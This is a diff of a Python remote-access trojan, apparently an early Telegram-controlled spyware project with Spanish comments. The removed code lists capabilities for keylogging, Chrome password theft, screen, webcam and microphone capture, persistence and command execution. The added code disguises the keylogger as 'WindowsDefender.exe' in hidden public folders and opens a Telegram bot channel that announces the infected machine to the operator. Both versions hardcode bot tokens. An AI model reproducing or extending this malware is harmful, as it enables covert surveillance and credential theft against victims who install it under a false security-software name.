@@ -9,123 +9,92 @@
 #╚█████╗░██████╔╝░╚████╔╝░ ░░░██║░░░█████╗░░██║░░░░░█████╗░░██║░░██╗░██████╔╝███████║██╔████╔██║
 #░╚═══██╗██╔═══╝░░░╚██╔╝░░ ░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║
 #██████╔╝██║░░░░░░░░██║░░░ ░░░██║░░░███████╗███████╗███████╗╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║
-#╚═════╝░╚═╝░░░░░░░░╚═╝░░░ ░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝ v4.0
-
-#region Import Library's
-#######
-##
-
-
-
-
-
-import os, os.path, platform, ctypes
-import logging
-from winreg import *
-from consoleTools import consoleDisplay as cd
-from PIL import ImageGrab                                                 # /capture_pc
-from shutil import copyfile, copyfileobj, rmtree, move                    # /ls, /pwd, /cd, /copy, /mv
-from sys import argv, path, stdout                                        # console output
-from json import loads                                                    # reading json from ipinfo.io
-from winshell import startup                                              # persistence
-from tendo import singleton                                               # this makes the application exit if there's another instance already running
-from win32com.client import Dispatch                                      # WScript.Shell
-from time import strftime, sleep
-from subprocess import Popen, PIPE                                        # /cmd_exec
-from getpass import getuser                                               # Obtiene el nombre del usuario
-import psutil                                                             # updating
-from pynput.keyboard import Key, Listener
-import shutil
-import win32clipboard                                                     # register clipboard
-import sqlite3                                                            # get chrome passwords
-import win32crypt                                                         # get chrome passwords
-import base64                                                             # /encrypt_all
-import datetime                                                           # /schedule
+#╚═════╝░╚═╝░░░░░░░░╚═╝░░░ ░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝ v1.0
 import time
-import threading                                                          # /proxy, /schedule
-import proxy
-import pyaudio, wave                                                      # /hear
-import telepot, requests                                                  # telepot       => telegram, requests       => file download
-from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
-import pythoncom, pyHook                                                # keylogger
-import socket                                                             # internal IP
-import getpass                                                            # get username
-import collections
-import urllib                                                             # wallpaper
-import cv2                                                                # webcam
-import yagmail
-from datetime import datetime
-from ctypes import *                                                      # fixing pyinstaller - we need to import all the ctypes to get api-ms-win-crt-*, you will also need https://www.microsoft.com/en-US/download/details.aspx?id=48145
 
-# pip install python-telegram-bot
+import telepot
+from telepot.loop import MessageLoop
 
 
-#######
-
-#endregion
-
-#region Variables Globales
-# Configuración de Inicio
-
-
-T_TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # < Token del Bot
-T_ID = "831756903"                                            # < ID Único
-#Config Trojan           True = Active || False =  disabled
-T_STARTUP = False
-T_TROJAN =  False
-T_DELAY = 1
-T_CONSOLE_DEBUG = True
-
-T_NAME_EXE = "RATpy.SpyTelegram.exe"
-T_NAME_REG = "RATpy.SpyTelegram"
-
-T_PATH_HIDDEN = r"C:\Users\Public\RAT_Telegram"
-
-#Config Keylogger
-T_KEYLOGGER = False                                   # Activate?
-T_PATH_LOG = r"C:\Users\Public\RAT_Telegram"          # Save Path
-T_NAME_LOG = r"reg.k"                                 # Filename key
-T_PATH_KEY = T_PATH_LOG+ "\\"+T_NAME_LOG                  # complete path
-
-#endregion
-
-def Information():  # Show Console Information
-    print("[RAT Config] Your ID is: " + T_ID)
-    print("[RAT Config] Your TOKEN is: " + T_TOKEN)
-    print("[RAT Config] Delayed start: " + str(T_DELAY))
-
-#region Commands TelegramBot
-def Handle(msg):
-    """
-    print(msg)
-    ID = msg['chat']['id']
-    response = "";
-
-    if 'text' in msg:
-        print("Hay texto")
-    """
+class Config:
+    def __init__(self):
+        self.NAME_KEY = "WindowsDefender" + ".exe"  # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
+        self.NAME_REG = "Windows Defeder REG"  # Nombre del Keylogger en el registro
+        self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings" + "\\"  # Ruta del Registro de teclas
+        self.LOG_NAME = "reg" + "." + "k"
+        self.PATH_HIDDEN = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"  # Ruta donde se esconderá el KEYLOGGER
+        self.PATH_KEY = self.PATH_HIDDEN + self.NAME_KEY  # <No cambiar>
+        self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME  # <No cambiar>
+    class Developer:
+        def __init__(self):
+            self.STARUP = False
+            self.TROJAN = False
+            self.DELAY = 1
+            self.CONSOLE_DEBUG = False
+    class TelegramBot:
+        def __init__(self):
+            self.ID = 831756903  # ID Principal [Obligatorio]
+            self.ID_2 = 000000000  # ID secundario [Opcional]
+            self.ID_3 = 000000000  # ID Terciario  [Opcional]
+            self.TOKEN = "1238108150:AAGdB66CsS_5fKpgVnOXvO8w9eSrT2V5n50"  # TOKEN de tu Bot [Obligatorio]
+            # Personalize
+            self.LEN_TEXT = 2  # 3600  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
 
 
-#endregion
 
 
-# Start Script
+
+
+
+def handle(msg):
+    content_type, chat_type, chat_id = telepot.glance(msg)
+    print(content_type, chat_type, chat_id)
+
+    if content_type == 'text':
+        bot.sendMessage(chat_id, msg['text'])
+
+
+# Starting Script
 if __name__ == '__main__':
     print("[RAT] Start")
+
+    # Instancia Bot con Token
+    bot = telepot.Bot(Config.TelegramBot().TOKEN)
+    bot.sendMessage(Config.TelegramBot().ID, "Usted está en linea ...")
+    MessageLoop(bot, handle).run_as_thread()
+    print('Listening ...')
+
+    # Keep the program running.
+    while True:
+        time.sleep(10)
+
+
+
+    """
+    
     Information() # Show Information
 
-    #me = singleton.SingleInstance()
-
-    # Telegram
-    #bot = telepot.Bot(T_TOKEN)    # Vincula token
-    #bot.message_loop(Handle)#Handle)    # Recibe Commands
+    updater = Updater(T_TOKEN, use_context=True)
+    # Get the dispatcher to register handlers
+    dp = updater.dispatcher
+    # on different commands - answer in Telegram
+    dp.add_handler(CommandHandler("start", start))
+    dp.add_handler(CommandHandler("help", help))
+    dp.add_handler(CommandHandler("sumar", sumar))
+    # on noncommand i.e message - echo the message on Telegram
+    dp.add_handler(MessageHandler(Filters.text, pizza))
+    # log all errors
+    dp.add_error_handler(error)
+    # Start the Bot
+    updater.start_polling()
+    updater.idle()
 
 
 
     # Espera comandos
     print("Esperando comandos...")
     # pythoncom.PumpMessages()  # Escucha los comandos
+    """
 
-    while 1:
-     time.sleep(10)
+
 
